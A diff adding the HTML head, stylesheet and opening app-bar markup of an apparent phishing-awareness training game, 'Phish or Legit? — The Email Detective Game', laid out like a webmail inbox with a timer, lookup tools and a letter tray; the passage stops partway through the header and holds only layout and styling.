@@ -1,0 +1,2119 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'">
+<meta name="referrer" content="no-referrer">
+<meta name="color-scheme" content="light dark">
+<title>Phish or Legit? — The Email Detective Game</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%230b57d0'/%3E%3Cpath d='M7 10h18v12H7z' fill='none' stroke='white' stroke-width='2'/%3E%3Cpath d='M7 10l9 7 9-7' fill='none' stroke='white' stroke-width='2'/%3E%3C/svg%3E">
+<style>
+:root {
+  --bg: #f6f8fc;
+  --surface: #ffffff;
+  --surface-2: #f2f6fc;
+  --surface-3: #e9eef6;
+  --hover: #eef2f9;
+  --selected: #d3e3fd;
+  --border: #dde3ea;
+  --text: #1f1f1f;
+  --muted: #5e6470;
+  --accent: #0b57d0;
+  --accent-soft: #d3e3fd;
+  --on-accent: #ffffff;
+  --compose: #c2e7ff;
+  --phish: #b3261e;
+  --phish-soft: #fce8e6;
+  --legit: #146c2e;
+  --legit-soft: #e6f4ea;
+  --warn: #8a5300;
+  --warn-soft: #fef7e0;
+  --focus: #0b57d0;
+  --link: #0b57d0;
+  --shadow: 0 1px 2px rgba(60, 64, 67, .15), 0 2px 6px rgba(60, 64, 67, .1);
+  --radius: 16px;
+  --mono: ui-monospace, "Cascadia Mono", "Segoe UI Mono", Consolas, "SF Mono", Menlo, monospace;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #111418;
+    --surface: #1d2127;
+    --surface-2: #242a31;
+    --surface-3: #2c333b;
+    --hover: #2a3038;
+    --selected: #2f3f5c;
+    --border: #353d47;
+    --text: #e8eaed;
+    --muted: #a5adb8;
+    --accent: #a8c7fa;
+    --accent-soft: #2f3f5c;
+    --on-accent: #0b1a33;
+    --compose: #2f4a6d;
+    --phish: #f2b8b5;
+    --phish-soft: #4a2321;
+    --legit: #8fd6a4;
+    --legit-soft: #1e3a27;
+    --warn: #f4c96b;
+    --warn-soft: #3a2f12;
+    --focus: #a8c7fa;
+    --link: #a8c7fa;
+    --shadow: 0 1px 2px rgba(0, 0, 0, .5), 0 2px 6px rgba(0, 0, 0, .35);
+    color-scheme: dark;
+  }
+}
+* { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+body { margin: 0; background: var(--bg); color: var(--text); font: 15px/1.5 system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
+@media (min-width: 1600px) { body { font-size: 16px; } }
+h1, h2, h3 { line-height: 1.25; margin: 0; }
+p { margin: 0 0 .8em; }
+button, input, select { font: inherit; color: inherit; }
+:focus-visible { outline: 3px solid var(--focus); outline-offset: 2px; border-radius: 6px; }
+.sr-only { position: absolute !important; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; border: 0; }
+[hidden] { display: none !important; }
+.skip-link { position: absolute; left: 8px; top: -60px; z-index: 99; background: var(--accent); color: var(--on-accent); padding: 8px 14px; border-radius: 8px; }
+.skip-link:focus { top: 8px; }
+svg.i { width: 20px; height: 20px; flex: none; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+
+.btn { display: inline-flex; align-items: center; justify-content: center; gap: .45em; min-height: 40px; padding: .45em 1.05em; border-radius: 999px; border: 1px solid var(--border); background: var(--surface); color: var(--text); font-weight: 600; cursor: pointer; white-space: nowrap; }
+.btn:hover { background: var(--hover); }
+.btn:disabled { opacity: .5; cursor: not-allowed; }
+.btn-primary { background: var(--accent); border-color: var(--accent); color: var(--on-accent); }
+.btn-primary:hover { background: var(--accent); filter: brightness(1.08); }
+.btn-sm { min-height: 34px; padding: .25em .85em; font-size: .92em; }
+.icon-btn { width: 40px; height: 40px; border-radius: 50%; border: 0; background: transparent; display: inline-grid; place-items: center; cursor: pointer; color: var(--muted); flex: none; }
+.icon-btn:hover { background: var(--hover); color: var(--text); }
+.icon-btn[aria-pressed="true"], .icon-btn.active { background: var(--accent-soft); color: var(--accent); }
+.icon-btn:disabled { opacity: .45; cursor: not-allowed; }
+
+/* ---------- App bar ---------- */
+.appbar { display: flex; align-items: center; gap: 8px; padding: 8px 12px; background: var(--bg); position: sticky; top: 0; z-index: 30; min-height: 64px; }
+.brand { display: flex; align-items: center; gap: 10px; min-width: 0; padding-left: 4px; }
+.brand-mark { width: 36px; height: 36px; border-radius: 10px; background: var(--accent); display: grid; place-items: center; flex: none; }
+.brand-mark svg { stroke: var(--on-accent); width: 22px; height: 22px; }
+.brand-title { font-size: 1.3em; font-weight: 500; white-space: nowrap; color: var(--muted); }
+.brand-sub { font-size: .8em; color: var(--muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 220px; }
+.search { flex: 1; max-width: 720px; margin: 0 12px 0 40px; position: relative; }
+.search input { width: 100%; height: 46px; border-radius: 999px; border: 1px solid transparent; background: var(--surface-3); padding: 0 16px 0 48px; }
+.search input:focus { background: var(--surface); border-color: var(--border); box-shadow: var(--shadow); outline: none; }
+.search svg { position: absolute; left: 14px; top: 13px; color: var(--muted); }
+.bar-right { display: flex; align-items: center; gap: 4px; margin-left: auto; }
+.timer { font-family: var(--mono); font-variant-numeric: tabular-nums; font-weight: 700; background: var(--surface-3); border-radius: 999px; padding: 6px 12px; margin-right: 4px; }
+.me { width: 34px; height: 34px; border-radius: 50%; display: grid; place-items: center; font-weight: 700; font-size: .8em; color: #fff; background: #7b4fa6; margin-left: 4px; flex: none; }
+
+/* ---------- Screens ---------- */
+.screen { padding: 24px 16px 48px; }
+.wrap { max-width: 980px; margin: 0 auto; }
+.card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); box-shadow: var(--shadow); }
+.screen-heading:focus { outline: none; }
+.hero { text-align: center; padding: 28px 8px 8px; }
+.hero h1 { font-size: clamp(1.9rem, 4.6vw, 3rem); letter-spacing: -.02em; }
+.hero p { color: var(--muted); font-size: 1.1em; max-width: 640px; margin: 12px auto 0; }
+.landing-grid { display: grid; gap: 18px; margin-top: 28px; }
+@media (min-width: 860px) { .landing-grid { grid-template-columns: 1.1fr 1fr; } }
+.panel { padding: 22px; }
+.panel h2 { font-size: 1.15em; margin-bottom: 14px; }
+fieldset { border: 0; padding: 0; margin: 0 0 18px; }
+legend { font-weight: 700; margin-bottom: 10px; padding: 0; }
+.set-options { display: grid; gap: 10px; }
+.set-option { position: relative; }
+.set-option input { position: absolute; opacity: 0; inset: 0; width: 100%; height: 100%; margin: 0; cursor: pointer; }
+.set-option label { display: flex; gap: 14px; align-items: center; padding: 14px 16px; border-radius: 12px; border: 2px solid var(--border); background: var(--surface-2); cursor: pointer; }
+.set-option input:checked + label { border-color: var(--accent); background: var(--accent-soft); }
+.set-option input:focus-visible + label { outline: 3px solid var(--focus); outline-offset: 2px; }
+.set-badge { width: 42px; height: 42px; border-radius: 10px; display: grid; place-items: center; font-weight: 800; background: var(--surface-3); flex: none; }
+.set-option input:checked + label .set-badge { background: var(--accent); color: var(--on-accent); }
+.set-name { font-weight: 700; display: block; }
+.set-desc { color: var(--muted); font-size: .92em; }
+.field label { display: block; font-weight: 700; margin-bottom: 6px; }
+.field .help { color: var(--muted); font-size: .88em; margin-top: 4px; }
+.input { width: 100%; min-height: 42px; padding: .45em .8em; border-radius: 10px; border: 1px solid var(--border); background: var(--surface-2); color: var(--text); }
+.input:focus-visible { outline: 3px solid var(--focus); outline-offset: 1px; }
+.rules { margin: 0; padding-left: 1.3em; }
+.rules li { margin-bottom: .55em; }
+.start-row { margin-top: 20px; display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
+.form-error { color: var(--phish); font-weight: 600; }
+
+/* Briefing */
+.persona { display: flex; gap: 16px; align-items: center; margin-bottom: 16px; }
+.avatar { width: 40px; height: 40px; border-radius: 50%; display: grid; place-items: center; flex: none; font-weight: 700; color: #fff; font-size: .95em; }
+.persona .avatar { width: 56px; height: 56px; font-size: 1.15em; }
+.persona-name { font-size: 1.25em; font-weight: 750; }
+.persona-role { color: var(--muted); overflow-wrap: anywhere; }
+.briefing-text { font-size: 1.04em; }
+.guide { margin-top: 16px; padding: 16px 18px; border-radius: 12px; background: var(--surface-2); border: 1px solid var(--border); }
+.guide h2 { font-size: 1em; margin-bottom: 10px; }
+.guide ol, .guide ul { margin: 0; padding-left: 1.3em; }
+.guide li { margin-bottom: .45em; }
+.guide code { font-family: var(--mono); font-size: .9em; background: var(--surface-3); padding: 0 4px; border-radius: 4px; }
+.briefing-actions { display: flex; justify-content: flex-end; margin-top: 18px; gap: 10px; flex-wrap: wrap; }
+
+/* ---------- Mailbox layout ---------- */
+.game { display: grid; gap: 8px; padding: 0 8px 8px; grid-template-areas: "list" "reader"; }
+.nav { grid-area: nav; padding: 4px 8px 0 4px; }
+.compose { display: inline-flex; align-items: center; gap: 12px; height: 56px; padding: 0 22px 0 16px; border-radius: 16px; border: 0; background: var(--compose); color: var(--text); font-weight: 600; margin: 0 0 14px; cursor: not-allowed; opacity: .85; }
+.folders { list-style: none; margin: 0; padding: 0; }
+.folders li { display: flex; align-items: center; gap: 16px; height: 34px; padding: 0 14px 0 18px; border-radius: 0 999px 999px 0; color: var(--muted); font-size: .93em; }
+.folders li.active { background: var(--selected); color: var(--text); font-weight: 700; }
+.folders .n { margin-left: auto; font-size: .85em; }
+.pane { background: var(--surface); border-radius: var(--radius); min-width: 0; }
+.pane-list { grid-area: list; }
+.pane-reader { grid-area: reader; display: flex; flex-direction: column; }
+.side { grid-area: side; }
+.list-head { padding: 12px 16px 8px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid var(--border); }
+.list-head h2 { font-size: 1em; }
+.list-head .count { margin-left: auto; color: var(--muted); font-size: .85em; }
+.progress { height: 4px; background: var(--surface-3); }
+.progress > span { display: block; height: 100%; background: var(--accent); width: 0; transition: width .25s; }
+.inbox-list { list-style: none; margin: 0; padding: 0; }
+.inbox-item button { display: grid; grid-template-columns: 22px 1fr auto; gap: 2px 10px; width: 100%; text-align: left; padding: 10px 16px 10px 12px; border: 0; border-bottom: 1px solid var(--border); background: transparent; cursor: pointer; align-items: center; }
+.inbox-item button:hover { box-shadow: inset 1px 0 0 var(--border), inset -1px 0 0 var(--border), 0 1px 3px rgba(60,64,67,.2); position: relative; z-index: 1; }
+.inbox-item button[aria-current="true"] { background: var(--selected); }
+.unread button:not([aria-current="true"]) { background: var(--surface); }
+.inbox-item.read button:not([aria-current="true"]) { background: var(--surface-2); }
+.star { color: var(--muted); }
+.star svg { width: 18px; height: 18px; }
+.ii-from { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.ii-time { color: var(--muted); font-size: .8em; white-space: nowrap; }
+.ii-line { grid-column: 2 / 4; display: flex; gap: 6px; align-items: center; min-width: 0; font-size: .92em; }
+.ii-subject { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; min-width: 0; }
+.ii-snip { color: var(--muted); }
+.ii-clip svg { width: 15px; height: 15px; color: var(--muted); }
+.unread .ii-from, .unread .ii-subj-text, .unread .ii-time { font-weight: 800; color: var(--text); }
+.chip { display: inline-flex; align-items: center; font-size: .72em; font-weight: 700; padding: 1px 7px; border-radius: 4px; white-space: nowrap; flex: none; }
+.chip-phish { background: var(--phish-soft); color: var(--phish); }
+.chip-legit { background: var(--legit-soft); color: var(--legit); }
+.chip-none { background: var(--surface-3); color: var(--muted); }
+.list-empty { padding: 24px 16px; color: var(--muted); }
+
+/* Reader */
+.reader-toolbar { display: flex; align-items: center; gap: 4px; padding: 6px 8px; border-bottom: 1px solid var(--border); }
+.reader-toolbar .pos { color: var(--muted); font-size: .85em; margin-left: auto; margin-right: 4px; }
+.mail { padding: 18px clamp(16px, 3vw, 28px) 24px; flex: 1; }
+.subject-row { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin: 0 0 18px 52px; }
+.mail-subject { font-size: clamp(1.15rem, 2vw, 1.4rem); font-weight: 400; overflow-wrap: anywhere; }
+.label-chip { font-size: .75em; background: var(--surface-3); color: var(--muted); border-radius: 4px; padding: 1px 6px; }
+.msg-head { display: grid; grid-template-columns: 40px 1fr auto; gap: 12px; align-items: start; }
+.msg-from .name { font-weight: 700; }
+.msg-from .addr { color: var(--muted); font-size: .88em; overflow-wrap: anywhere; }
+.to-me { border: 0; background: transparent; color: var(--muted); font-size: .85em; padding: 2px 4px; margin-left: -4px; border-radius: 4px; cursor: pointer; display: inline-flex; align-items: center; gap: 2px; }
+.to-me:hover { background: var(--hover); }
+.to-me svg { width: 16px; height: 16px; }
+.msg-meta { display: flex; align-items: center; gap: 0; color: var(--muted); font-size: .82em; white-space: nowrap; }
+.msg-meta .when { margin-right: 6px; }
+.menu-wrap { position: relative; }
+.menu { position: absolute; right: 0; top: 42px; z-index: 20; min-width: 200px; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; box-shadow: 0 4px 16px rgba(0,0,0,.2); padding: 6px 0; }
+.menu [role="menuitem"] { display: flex; width: 100%; gap: 12px; align-items: center; padding: 8px 16px; border: 0; background: transparent; text-align: left; cursor: pointer; font-size: .92em; }
+.menu [role="menuitem"]:hover, .menu [role="menuitem"]:focus { background: var(--hover); outline: none; }
+.menu [aria-disabled="true"] { color: var(--muted); cursor: not-allowed; }
+.hdr-details { margin: 10px 0 0 52px; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; box-shadow: var(--shadow); background: var(--surface); font-size: .86em; max-width: 620px; }
+.hdr-details table { border-collapse: collapse; }
+.hdr-details th { text-align: right; color: var(--muted); font-weight: 400; padding: 2px 12px 2px 0; vertical-align: top; white-space: nowrap; }
+.hdr-details td { padding: 2px 0; overflow-wrap: anywhere; }
+.mail-body { padding: 16px 0 6px 52px; max-width: 76ch; overflow-wrap: anywhere; }
+.mail-body p { margin-bottom: 1em; }
+.ilink { border: 0; background: none; padding: 0; color: var(--link); text-decoration: underline; cursor: pointer; text-align: left; overflow-wrap: anywhere; font: inherit; }
+.ibtn { display: inline-block; border: 0; padding: .5em 1.2em; border-radius: 6px; background: #1a73e8; color: #fff; font-weight: 600; cursor: pointer; margin: 2px 0; }
+@media (prefers-color-scheme: dark) { .ibtn { background: #3b82e8; } }
+.quoted-toggle { border: 1px solid var(--border); background: var(--surface-3); border-radius: 6px; padding: 0 8px; line-height: 14px; height: 16px; cursor: pointer; color: var(--muted); font-weight: 800; letter-spacing: 1px; }
+.quoted { margin-top: 10px; padding-left: 12px; border-left: 2px solid var(--border); color: var(--muted); white-space: pre-wrap; font-size: .93em; }
+.qr { display: inline-flex; flex-direction: column; align-items: center; gap: 6px; padding: 12px; border: 1px dashed var(--border); border-radius: 8px; background: #fff; color: #111; }
+.qr svg { width: 132px; height: 132px; display: block; }
+.qr span { font-size: .75em; font-weight: 700; letter-spacing: .06em; }
+.invite { margin: 0 0 4px 52px; border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px; max-width: 560px; }
+.invite h3 { font-size: 1em; margin-bottom: 6px; }
+.invite dl { display: grid; grid-template-columns: auto 1fr; gap: 2px 12px; margin: 0 0 10px; font-size: .9em; }
+.invite dt { color: var(--muted); }
+.invite dd { margin: 0; overflow-wrap: anywhere; }
+.rsvp { display: flex; gap: 8px; }
+.rsvp span { border: 1px solid var(--border); border-radius: 999px; padding: 2px 14px; font-size: .85em; color: var(--muted); }
+.atts { margin: 8px 0 8px 52px; padding-top: 14px; border-top: 1px solid var(--border); }
+.atts-title { font-size: .88em; font-weight: 700; margin-bottom: 8px; }
+.att-warn { display: flex; gap: 8px; align-items: flex-start; font-size: .85em; color: var(--warn); background: var(--warn-soft); border-radius: 8px; padding: 8px 10px; margin-bottom: 10px; max-width: 560px; }
+.att-warn svg { width: 18px; height: 18px; }
+.att-list { display: flex; flex-wrap: wrap; gap: 10px; }
+.att-chip { display: flex; align-items: center; gap: 10px; width: 210px; padding: 10px 12px; border: 1px solid var(--border); border-radius: 8px; background: var(--surface-2); cursor: pointer; text-align: left; }
+.att-chip:hover { background: var(--hover); }
+.att-icon { width: 30px; height: 30px; border-radius: 4px; display: grid; place-items: center; color: #fff; font-size: .62em; font-weight: 800; flex: none; }
+.att-name { font-size: .85em; font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; display: block; }
+.att-size { font-size: .78em; color: var(--muted); }
+.hint-line { font-weight: 700; display: flex; align-items: center; gap: 10px; margin: 18px 0 0 52px; }
+.hint-letter { display: inline-grid; place-items: center; width: 2em; height: 2em; border-radius: 8px; border: 2px solid var(--text); font-family: var(--mono); font-size: 1.1em; }
+.verdict-bar { position: sticky; bottom: 0; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; padding: 12px clamp(16px, 3vw, 28px); border-top: 1px solid var(--border); background: var(--surface); border-radius: 0 0 var(--radius) var(--radius); }
+.verdict-bar .label { font-weight: 700; margin-right: auto; }
+.vbtn { min-width: 150px; }
+.vbtn[data-v="phish"] { color: var(--phish); border-color: currentColor; }
+.vbtn[data-v="legit"] { color: var(--legit); border-color: currentColor; }
+.vbtn[data-v="phish"][aria-pressed="true"] { background: var(--phish); color: var(--surface); border-color: var(--phish); }
+.vbtn[data-v="legit"][aria-pressed="true"] { background: var(--legit); color: var(--surface); border-color: var(--legit); }
+.kbd-help { color: var(--muted); font-size: .8em; width: 100%; }
+kbd { font-family: var(--mono); font-size: .9em; border: 1px solid var(--border); border-bottom-width: 2px; border-radius: 4px; padding: 0 5px; background: var(--surface-2); }
+
+/* Show original */
+.orig { padding: 16px clamp(16px, 3vw, 28px) 24px; }
+.orig-head { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 14px; }
+.orig-head h2 { font-size: 1.15em; font-weight: 500; margin-right: auto; }
+.orig-summary { border-collapse: collapse; font-size: .88em; margin-bottom: 12px; width: 100%; max-width: 760px; }
+.orig-summary th { text-align: left; font-weight: 400; color: var(--muted); padding: 6px 16px 6px 0; width: 130px; vertical-align: top; border-bottom: 1px solid var(--border); }
+.orig-summary td { padding: 6px 0; border-bottom: 1px solid var(--border); overflow-wrap: anywhere; }
+.orig-note { font-size: .85em; color: var(--warn); background: var(--warn-soft); padding: 8px 12px; border-radius: 8px; max-width: 760px; }
+.raw { font-family: var(--mono); font-size: .8em; line-height: 1.45; background: var(--surface-2); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px; white-space: pre-wrap; overflow-wrap: anywhere; margin: 0; max-height: none; user-select: text; }
+
+/* Link status bar + toast */
+.linkbar { position: fixed; left: 0; bottom: 0; z-index: 60; max-width: min(70vw, 900px); background: var(--surface-3); border: 1px solid var(--border); border-left: 0; border-bottom: 0; border-radius: 0 6px 0 0; padding: 3px 10px; font-size: .78em; font-family: var(--mono); color: var(--text); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; pointer-events: none; }
+.toast { position: fixed; left: 50%; bottom: 24px; transform: translateX(-50%); z-index: 70; width: min(560px, calc(100vw - 24px)); background: #303134; color: #f1f3f4; border-radius: 8px; padding: 12px 14px; box-shadow: 0 6px 24px rgba(0,0,0,.35); font-size: .9em; }
+.toast .url { font-family: var(--mono); font-size: .9em; overflow-wrap: anywhere; display: block; margin: 4px 0 10px; color: #a8c7fa; }
+.toast .row { display: flex; gap: 8px; justify-content: flex-end; }
+.toast button { border: 0; background: transparent; color: #a8c7fa; font-weight: 700; padding: 6px 10px; border-radius: 6px; cursor: pointer; }
+.toast button:hover { background: rgba(255,255,255,.08); }
+
+/* Side panel: Lookup + Letter tray */
+.side { display: flex; flex-direction: column; }
+.side-tabs { display: flex; gap: 4px; padding: 8px 8px 0; border-bottom: 1px solid var(--border); align-items: flex-end; }
+.side-tabs [role="tab"] { border: 0; background: transparent; padding: 8px 12px 10px; font-weight: 600; color: var(--muted); border-bottom: 3px solid transparent; cursor: pointer; display: inline-flex; gap: 6px; align-items: center; }
+.side-tabs [role="tab"][aria-selected="true"] { color: var(--accent); border-bottom-color: var(--accent); }
+.side-tabs .side-close { margin-left: auto; margin-bottom: 4px; }
+.side-body { padding: 14px 16px 18px; }
+.lk-form { display: grid; gap: 10px; }
+.lk-form label { font-weight: 700; font-size: .88em; display: block; margin-bottom: 4px; }
+.lk-form select.input { appearance: auto; }
+.lk-help { color: var(--muted); font-size: .82em; margin: 0; }
+.lk-out { margin-top: 12px; font-family: var(--mono); font-size: .78em; line-height: 1.45; white-space: pre-wrap; overflow-wrap: anywhere; background: var(--surface-2); border: 1px solid var(--border); border-radius: 8px; padding: 10px 12px; min-height: 3em; }
+.lk-out .ok { color: var(--legit); font-weight: 700; }
+.lk-out .bad { color: var(--phish); font-weight: 700; }
+.lk-out .warn { color: var(--warn); font-weight: 700; }
+.tray-explain { color: var(--muted); font-size: .9em; }
+.tiles { display: flex; flex-wrap: wrap; gap: 8px; min-height: 52px; margin: 10px 0 14px; padding: 8px; border-radius: 10px; background: var(--surface-2); border: 1px dashed var(--border); align-items: center; }
+.tile { width: 42px; height: 48px; border-radius: 8px; display: grid; place-items: center; font-family: var(--mono); font-weight: 800; font-size: 1.35em; background: var(--surface); border: 1px solid var(--border); box-shadow: 0 2px 0 var(--border); }
+.tiles-empty { color: var(--muted); font-size: .88em; padding: 0 6px; }
+.status { margin-top: 12px; min-height: 1.5em; font-weight: 600; }
+.status.bad { color: var(--phish); }
+.status.good { color: var(--legit); }
+.cooldown { margin-top: 8px; padding: 10px 12px; border-radius: 8px; background: var(--warn-soft); color: var(--warn); font-weight: 700; }
+.submit-help { color: var(--muted); font-size: .85em; margin-top: 6px; }
+.solved-note { padding: 10px 12px; border-radius: 8px; background: var(--legit-soft); color: var(--legit); font-weight: 600; margin-bottom: 12px; font-size: .92em; }
+.pw-row { display: flex; gap: 8px; }
+.pw-row .input { font-family: var(--mono); text-transform: uppercase; letter-spacing: .15em; font-weight: 700; }
+.pw-row .btn { border-radius: 10px; }
+
+/* Wide desktop: nav | list | reader | side */
+@media (min-width: 1180px) {
+  body.in-game { height: 100dvh; overflow: hidden; display: flex; flex-direction: column; }
+  body.in-game main { flex: 1; min-height: 0; }
+  .game { height: 100%; grid-template-columns: minmax(300px, 360px) 1fr minmax(300px, 340px); grid-template-areas: "list reader side"; }
+  .game > .pane { overflow-y: auto; }
+  .side-close, .reader-back, .bar-side-btn { display: none !important; }
+}
+@media (min-width: 1500px) {
+  .game { grid-template-columns: 220px minmax(320px, 380px) 1fr minmax(320px, 360px); grid-template-areas: "nav list reader side"; }
+}
+@media (max-width: 1499.98px) { .nav { display: none; } }
+/* Medium: list | reader, side panel as a drawer */
+@media (min-width: 760px) and (max-width: 1179.98px) {
+  body.in-game { height: 100dvh; overflow: hidden; display: flex; flex-direction: column; }
+  body.in-game main { flex: 1; min-height: 0; }
+  .game { height: 100%; grid-template-columns: 320px 1fr; grid-template-areas: "list reader"; }
+  .game > .pane { overflow-y: auto; }
+  .reader-back { display: none !important; }
+}
+@media (max-width: 1179.98px) {
+  .side { position: fixed; top: 0; right: 0; bottom: 0; width: min(400px, 100vw); z-index: 50; border-radius: 0; box-shadow: -4px 0 24px rgba(0,0,0,.25); overflow-y: auto; transform: translateX(105%); visibility: hidden; transition: transform .2s, visibility .2s; }
+  .side.open { transform: none; visibility: visible; }
+  .search { margin-left: 12px; }
+}
+/* Phone */
+@media (max-width: 759.98px) {
+  .game { grid-template-columns: 1fr; padding: 0 0 8px; }
+  .pane { border-radius: 0; }
+  .game:not(.reading) .pane-reader { display: none; }
+  .game.reading .pane-list { display: none; }
+  .search, .brand-sub, .me { display: none; }
+  .appbar { padding: 6px 8px; min-height: 56px; }
+  .brand-title { font-size: 1.1em; }
+  .timer { padding: 4px 8px; font-size: .9em; }
+  .subject-row, .mail-body, .atts, .hint-line, .hdr-details, .invite { margin-left: 0; padding-left: 0; }
+  .mail-body { padding-left: 0; }
+  .vbtn { flex: 1; min-width: 0; }
+  .verdict-bar { border-radius: 0; }
+  .verdict-bar .label { width: 100%; }
+  .kbd-help { display: none; }
+  .att-chip { width: 100%; }
+}
+
+/* Result */
+.result-hero { padding: 26px; text-align: center; }
+.unlocked-word { font-family: var(--mono); font-size: clamp(2rem, 7vw, 3.4rem); font-weight: 800; letter-spacing: .3em; margin: 10px 0 4px; padding-left: .3em; color: var(--legit); }
+.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-top: 20px; }
+.stat { padding: 14px; border-radius: 12px; background: var(--surface-2); border: 1px solid var(--border); }
+.stat-label { color: var(--muted); font-size: .85em; }
+.stat-value { font-size: 1.6em; font-weight: 800; font-variant-numeric: tabular-nums; }
+.note { margin-top: 18px; padding: 16px 18px; border-left: 4px solid var(--accent); background: var(--accent-soft); border-radius: 8px; }
+.note p:last-child { margin: 0; }
+.debrief-list { list-style: none; padding: 0; margin: 18px 0 0; display: grid; gap: 12px; }
+.db-card { padding: 16px 18px; }
+.db-head { display: flex; flex-wrap: wrap; align-items: baseline; gap: 8px 14px; margin-bottom: 10px; }
+.db-num { font-weight: 800; color: var(--muted); }
+.db-subject { font-weight: 700; flex: 1; min-width: 200px; }
+.db-verdicts { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 10px; font-size: .92em; }
+.db-verdicts > span { display: inline-flex; align-items: center; gap: 6px; }
+.mark-ok { color: var(--legit); font-weight: 800; }
+.mark-bad { color: var(--phish); font-weight: 800; }
+.db-card dl { margin: 0; display: grid; gap: 8px; }
+.db-card dt { font-weight: 700; font-size: .85em; text-transform: uppercase; letter-spacing: .05em; color: var(--muted); }
+.db-card dd { margin: 0; }
+.result-actions { display: flex; gap: 10px; justify-content: center; margin-top: 22px; flex-wrap: wrap; }
+
+/* Dialogs */
+dialog { border: 1px solid var(--border); border-radius: var(--radius); padding: 0; background: var(--surface); color: var(--text); width: min(860px, calc(100vw - 24px)); max-height: calc(100dvh - 24px); box-shadow: 0 20px 60px rgba(0,0,0,.35); }
+dialog::backdrop { background: rgba(10, 15, 25, .55); }
+.dlg-head { display: flex; align-items: center; gap: 10px; padding: 14px 18px; border-bottom: 1px solid var(--border); position: sticky; top: 0; background: var(--surface); z-index: 1; }
+.dlg-head h2 { font-size: 1.1em; margin-right: auto; overflow-wrap: anywhere; }
+.dlg-body { padding: 18px; }
+.dlg-small { width: min(460px, calc(100vw - 24px)); }
+.dlg-actions { display: flex; justify-content: flex-end; gap: 10px; padding: 0 18px 18px; }
+.preview-page { background: #fff; color: #222; border: 1px solid #ccc; border-radius: 4px; padding: 28px 32px; margin: 0 auto 16px; max-width: 620px; box-shadow: 0 2px 8px rgba(0,0,0,.15); }
+.preview-page p { margin-bottom: .7em; }
+.preview-page .ilink { color: #0b57d0; }
+.preview-meta { color: var(--muted); font-size: .85em; margin-bottom: 12px; text-align: center; }
+.preview-locked { text-align: center; padding: 40px 20px; color: var(--muted); }
+.preview-locked svg { width: 48px; height: 48px; margin-bottom: 10px; }
+.preview-code { font-family: var(--mono); font-size: .82em; white-space: pre-wrap; background: var(--surface-2); padding: 12px; border-radius: 8px; border: 1px solid var(--border); }
+.error-box { padding: 14px; border-radius: 10px; background: var(--phish-soft); color: var(--phish); font-weight: 600; margin: 16px; }
+
+@media (prefers-reduced-motion: reduce) { * { transition: none !important; animation: none !important; } }
+@media print { .appbar, .result-actions { display: none !important; } body { background: #fff; } }
+</style>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+
+<header class="appbar" id="appbar" hidden>
+  <div class="brand">
+    <div class="brand-mark" aria-hidden="true"><svg class="i" viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg></div>
+    <div>
+      <div class="brand-title">Mail</div>
+      <div class="brand-sub" id="bar-sub"></div>
+    </div>
+  </div>
+  <div class="search" role="search">
+    <svg class="i" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
+    <label for="search" class="sr-only">Search mail</label>
+    <input id="search" type="search" placeholder="Search mail" autocomplete="off">
+  </div>
+  <div class="bar-right">
+    <div class="timer" role="timer" aria-label="Time elapsed" id="timer">00:00</div>
+    <button type="button" class="icon-btn bar-side-btn" id="bar-lookup" aria-label="Open Lookup tools" title="Lookup">
+      <svg class="i" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg>
+    </button>
+    <button type="button" class="icon-btn bar-side-btn" id="bar-tray" aria-label="Open Letter tray" title="Letter tray">
+      <svg class="i" viewBox="0 0 24 24"><rect x="3" y="4" width="7" height="7" rx="1"/><rect x="14" y="4" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+    </button>
+    <button type="button" class="icon-btn" id="btn-briefing" aria-haspopup="dialog" aria-label="Open briefing and investigation guide" title="Briefing">
+      <svg class="i" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.6.3-1 .9-1 1.6V14M12 17h.01"/></svg>
+    </button>
+    <button type="button" class="icon-btn" id="btn-reset" aria-haspopup="dialog" aria-label="Reset game" title="Reset">
+      <svg class="i" viewBox="0 0 24 24"><path d="M3 12a9 9 0 1 0 3-6.7"/><path d="M3 4v5h5"/></svg>
+    </button>
+    <span class="me" id="me" aria-hidden="true"></span>
